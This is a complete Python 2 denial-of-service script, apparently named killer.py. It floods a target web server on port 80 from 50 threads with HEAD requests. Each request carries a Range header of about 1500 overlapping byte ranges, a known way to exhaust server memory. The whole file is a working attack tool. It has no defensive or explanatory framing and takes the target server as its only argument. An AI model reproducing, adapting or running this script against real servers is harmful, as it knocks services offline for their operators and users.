# encoding:utf8
#!/usr/bin/env python
import socket
import threading
import sys

headers = '''
HEAD / HTTP/1.1
Host: %s
Range: bytes=%s
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

'''

#fragment count and loop count
COUNT = 1500
#concurrent count
PARALLEL = 50
PORT = 80

def req(server):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, PORT))
        s.send(headers % (server, fragment(COUNT)))
        s.close()
    except:
        print 'Server Seems Weak. Please Stop.'

def fragment(n):
    ret = ''
    for i in xrange(n):
        if i == 0:
            ret = ret + '0-' + str(i + 1)
        else:
            ret = ret + ',0-' + str(i + 1)
    return ret

def run(server):
    for _ in xrange(COUNT):
        req(server)

if len(sys.argv) != 2:
    print 'killer.py $server'
    sys.exit(0)

#run
srv = sys.argv[1]
for _ in xrange(PARALLEL):
    threading.Thread(target=run, args=(srv,)).start()
